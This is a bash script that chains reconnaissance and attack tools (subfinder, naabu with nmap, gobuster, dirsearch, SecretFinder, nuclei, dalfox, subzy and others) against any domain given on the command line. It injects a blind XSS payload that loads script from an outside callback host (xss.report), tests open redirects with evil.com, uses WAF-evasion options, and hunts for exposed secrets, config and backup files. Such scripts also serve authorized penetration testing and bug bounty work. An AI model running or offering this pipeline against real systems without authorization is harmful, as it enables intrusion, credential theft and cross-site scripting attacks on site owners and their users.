#!/bin/bash

# Check if the domain is provided
if [ -z "$1" ]; then
    echo "Usage: $0 <domain>"
    exit 1
fi

DOMAIN=$1
TARGET_DIR="target_$DOMAIN"
LOG_FILE="output.log"
mkdir -p $TARGET_DIR
cd $TARGET_DIR

# Subfinder
echo -e "\033[1;34m[INFO]\033[0m Running Subfinder..." | tee -a $LOG_FILE
subfinder -d $DOMAIN -all -recursive -o sub.txt | tee -a $LOG_FILE
subfinder -d $DOMAIN -all -o sub2.txt | tee -a $LOG_FILE
cat sub.txt sub2.txt | tee sub3.txt | tee -a $LOG_FILE
sort sub3.txt | uniq > subdomains.txt | tee -a $LOG_FILE

# Fetching subdomains from crt.sh
echo -e "\033[1;34m[INFO]\033[0m Fetching subdomains from crt.sh..." | tee -a $LOG_FILE
curl -s "https://crt.sh/?q=$DOMAIN&output=json" | jq -r '.[].name_value' | grep -Po '(\w+\.\w+)$' | anew subdomains.txt | tee -a $LOG_FILE

# Checking alive subdomains
echo -e "\033[1;34m[INFO]\033[0m Checking alive subdomains..." | tee -a $LOG_FILE
cat subdomains.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt | tee -a $LOG_FILE

# Running Naabu
echo -e "\033[1;34m[INFO]\033[0m Running Naabu..." | tee -a $LOG_FILE
naabu -list subdomains.txt -c 50 -nmap-cli 'nmap -sV -sC' -o naabu-full.txt | tee -a $LOG_FILE

# Running Katana
echo -e "\033[1;34m[INFO]\033[0m Running Katana..." | tee -a $LOG_FILE
katana -u subdomains_alive.txt -d 5 waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef js,css,png,svg,jpg,woff2,jpeg,gif,svg | tee allurls.txt | tee -a $LOG_FILE

# Filter URLs containing sensitive files
echo -e "\033[1;34m[INFO]\033[0m Filtering URLs containing sensitive files..." | tee -a $LOG_FILE
cat allurls.txt | grep -E '\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config' | tee -a $LOG_FILE

# Run Gobuster
echo -e "\033[1;34m[INFO]\033[0m Running Gobuster..." | tee -a $LOG_FILE
gobuster dir -u https://$DOMAIN -w /home/kali/wordlists/directory-list-2.3-medium.txt -x php,html -t 50 -s 404 -r | tee -a $LOG_FILE

# Run Dirsearch
echo -e "\033[1;34m[INFO]\033[0m Running Dirsearch..." | tee -a $LOG_FILE
dirsearch -u https://$DOMAIN -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,pyc,rb,rby,php,php~,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http,sql.zip,sql.tar.gz,sql~,swp,wsdl,tar,bz2,tar.gz,txt,xml,.log,.xml,.js,.json | tee -a $LOG_FILE

# Filter JavaScript files from URLs
echo -e "\033[1;34m[INFO]\033[0m Filtering JavaScript files from URLs..." | tee -a $LOG_FILE
cat allurls.txt | grep -E "\.js$" >> js.txt | tee -a $LOG_FILE

# Fetch URLs using waybackurls and gau
echo -e "\033[1;34m[INFO]\033[0m Fetching URLs using waybackurls and gau..." | tee -a $LOG_FILE
cat subdomains_alive.txt | waybackurls | tee way.txt | tee -a $LOG_FILE
cat subdomains_alive.txt | gau > params.txt | tee -a $LOG_FILE
cat params.txt way.txt | uro -o filterparam.txt | tee -a $LOG_FILE

# Filter JavaScript files from filtered parameters
echo -e "\033[1;34m[INFO]\033[0m Filtering JavaScript files from filtered parameters..." | tee -a $LOG_FILE
cat filterparam.txt | grep ".js$" > jsfiles.txt | tee -a $LOG_FILE
cat jsfiles.txt | uro | anew jsfiles.txt | tee -a $LOG_FILE
cat jsfiles.txt js.txt | tee js1.txt | tee -a $LOG_FILE
cat js1.txt | uniq > jsfile.txt | tee -a $LOG_FILE

# Run Nuclei for exposure detection
echo -e "\033[1;34m[INFO]\033[0m Running Nuclei for exposure detection..." | tee -a $LOG_FILE
cat jsfile.txt | nuclei -t /home/kali/nuclei-templates/http/exposures/ -c 30 | tee nuclei1.txt | tee -a $LOG_FILE

# Run SecretFinder for secrets in JavaScript files
echo -e "\033[1;34m[INFO]\033[0m Running SecretFinder for secrets in JavaScript files..." | tee -a $LOG_FILE
cat jsfiles.txt | while read url; do python3 /home/kali/VulnerabilityScanners/secretfinder/SecretFinder.py -i $url -o cli >> secret.txt; done | tee -a $LOG_FILE

# Run subzy for subdomain takeover detection
echo -e "\033[1;34m[INFO]\033[0m Running Subzy for subdomain takeover detection..." | tee -a $LOG_FILE
subzy run --targets subdomains_alive.txt --verify_ssl --hide_fails | tee subtakeover.txt | tee -a $LOG_FILE

# Run Nuclei for various detections
echo -e "\033[1;34m[INFO]\033[0m Running Nuclei for various detections..." | tee -a $LOG_FILE
nuclei -list sorted_param_10000.txt -c 70 -rl 200 -fhr -lfa -t /home/tanvir/coffin-templates/ -o nucleicm3.txt -es info | tee -a $LOG_FILE

# Run XSS detection
echo -e "\033[1;34m[INFO]\033[0m Running XSS detection..." | tee -a $LOG_FILE
echo https://$DOMAIN/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt | tee -a $LOG_FILE
cat xss_output.txt | grep -oP 'URL: \K\S+' | sed 's/=.*/=/' | sort -u > final.txt | tee -a $LOG_FILE
subfinder -d $DOMAIN | httpx-toolkit -silent | katana -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss.report/c/tanvir6197></script>' -parameters | tee xss1.txt | tee -a $LOG_FILE
cat final.txt | dalfox pipe --waf-evasion --worker 10 | tee xss2.txt | tee -a $LOG_FILE

# Run Corsy for CORS detection
echo -e "\033[1;34m[INFO]\033[0m Running Corsy for CORS detection..." | tee -a $LOG_FILE
python3 /home/kali/VulnerabilityScanners/Corsy/corsy.py -i subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked" | tee corsy.txt | tee -a $LOG_FILE
nuclei -list subdomains_alive.txt -t /home/tanvir/coffin-templates/cors.yaml | tee cors.txt | tee -a $LOG_FILE

# Run Nuclei for CVEs and other detections
echo -e "\033[1;34m[INFO]\033[0m Running Nuclei for CVEs and other detections..." | tee -a $LOG_FILE
nuclei -list subdomains_alive.txt -tags cves,osint,tech | tee nuclei4.txt | tee -a $LOG_FILE
cat allurls.txt | gf lfi | nuclei -tags lfi | tee lfi.txt | tee -a $LOG_FILE

# Run Waymore for URL fetching and LFI detection
echo -e "\033[1;34m[INFO]\033[0m Running Waymore for URL fetching and LFI detection..." | tee -a $LOG_FILE
waymore -i $DOMAIN -mode U --no-subs | tee waymore.txt | tee -a $LOG_FILE
cat waymore.txt | uro | sed 's/=.*/=/' | gf lfi | nuclei -tags lfi | tee lfi2.txt | tee -a $LOG_FILE
nuclei -u http://$DOMAIN -t lfi-detection.yaml | tee lfi3.txt | tee -a $LOG_FILE

# Run OpenRedirex for open redirect detection
echo -e "\033[1;34m[INFO]\033[0m Running OpenRedirex for open redirect detection..." | tee -a $LOG_FILE
cat allurls.txt | gf redirect | openredirex -p /home/kali/loxs/payloads/or.txt | tee or1.txt | tee -a $LOG_FILE
waybackurls https://$DOMAIN/ | grep -a -i \=http | qsreplace 'http://evil.com' | while read host; do curl -s -L "$host" -I|grep "evil.com" && echo -e "$host \033[0;31mVulnerable\n";done | tee or2.txt | tee -a $LOG_FILE

# Run Nuclei for CRLF detection
echo -e "\033[1;34m[INFO]\033[0m Running Nuclei for CRLF detection..." | tee -a $LOG_FILE
cat subdomains_alive.txt | nuclei -t /home/tanvir/coffin-templates/cRlf.yaml | tee crlf.txt | tee -a $LOG_FILE
cat allurls.txt | gf redirect | openredirex | tee or3.txt | tee -a $LOG_FILE

# Run Dalfox for XSS detection
echo -e "\033[1;34m[INFO]\033[0m Running Dalfox for XSS detection..." | tee -a $LOG_FILE
cat filterparam.txt | gf xss | tee gf.txt | tee -a $LOG_FILE
cat filterparam.txt | Gxss | tee gxss.txt | tee -a $LOG_FILE
cat gf.txt gxss.txt | uniq > xss3.txt | tee -a $LOG_FILE
dalfox file xss3.txt -b --waf-evasion | tee dalfox.txt | tee -a $LOG_FILE

# Run XSS Vibes for XSS detection
echo -e "\033[1;34m[INFO]\033[0m Running XSS Vibes for XSS detection..." | tee -a $LOG_FILE
cat xss3.txt | while read url; do python3 /home/kali/ExploitationTools/xss_vibes/main.py -f $url -o cli >> secret.txt; done | tee -a $LOG_FILE

echo -e "\033[1;32m[INFO]\033[0m All tasks completed." | tee -a $LOG_FILE
